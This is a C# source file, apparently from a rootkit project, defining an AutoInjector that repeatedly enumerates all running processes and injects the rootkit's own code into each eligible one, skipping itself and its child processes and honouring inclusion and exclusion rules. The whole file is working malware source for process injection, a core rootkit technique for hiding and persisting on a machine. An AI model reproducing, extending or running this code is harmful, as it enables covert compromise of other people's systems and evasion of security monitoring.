using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace CSharpRootkit
{
    public static class AutoInjector
    {

        private static HashSet<int> injectedPids = new HashSet<int>();
        private static Action InjectionEntryPoint;

        private static int LoopInterval;
        public static bool started;

        public static void Start(Action func, bool WaitForFirstInjectIteration = true,  int intervalMs=100) 
        {
            injectedPids.Clear();
            InjectionEntryPoint = func;
            LoopInterval = intervalMs;
            if (!RootKitInterface.started) 
            {
                throw new Exception("The RootKitInterface must be started before starting the AutoInjector.");
                //throw error, RootKitInterface needs to be started.
            }

            started = true;

            if (WaitForFirstInjectIteration) 
            {
                InjectAllPossible();
            }

            new Thread(InjectAllPossibleLoop).Start();

        }

        public static void Stop() 
        {
            started = false;
        }


        private static void InjectAllPossibleLoop() 
        {
            while (started) 
            { 
                Thread.Sleep(LoopInterval);
                InjectAllPossible();
            }
        }

        private static void InjectAllPossible()
        {
            byte[] selfBytes = Utils.GetCurrentSelfBytes();
            int currentProcId = (int)NativeMethods.GetCurrentProcessId();
            HashSet<int> collectedPids = new HashSet<int>();
            foreach (Process proc in Process.GetProcesses())
            {
                collectedPids.Add(proc.Id);
                if (!RootKitInterface.started && started)
                {
                    proc.Dispose();
                    throw new Exception("The AutoInjector must be stopped before stopping the rootkit interface!");
                }
                else if (!started) 
                {
                    proc.Dispose();
                    return;
                }


                if (injectedPids.Contains(proc.Id))
                {
                    proc.Dispose();
                    continue;
                }

                if (proc.Id == currentProcId || !Utils.GetParentProcess(proc.Id, out int parentProc) || parentProc == currentProcId) //make sure its not a subprocess, for example if c# spawns a conhost, injecting into it can cause a crash.
                {
                    proc.Dispose();
                    continue;
                }

                IntPtr procHandle = SharpInjector.GetProcessHandleWithRequiredRights(proc.Id);
                if (!RootKitInterface.IsAgainstInclusionExclusionRules(procHandle) && Utils.ShouldInject(procHandle))
                {
                    SharpInjector.Inject(procHandle, InjectionEntryPoint, 0);
                    injectedPids.Add(proc.Id);
                }

                NativeMethods.CloseHandle(procHandle);
                proc.Dispose();
            }

            injectedPids.RemoveWhere((pid) => !collectedPids.Contains(pid));//remove pids where the process has been terminated.
        }



    }
}
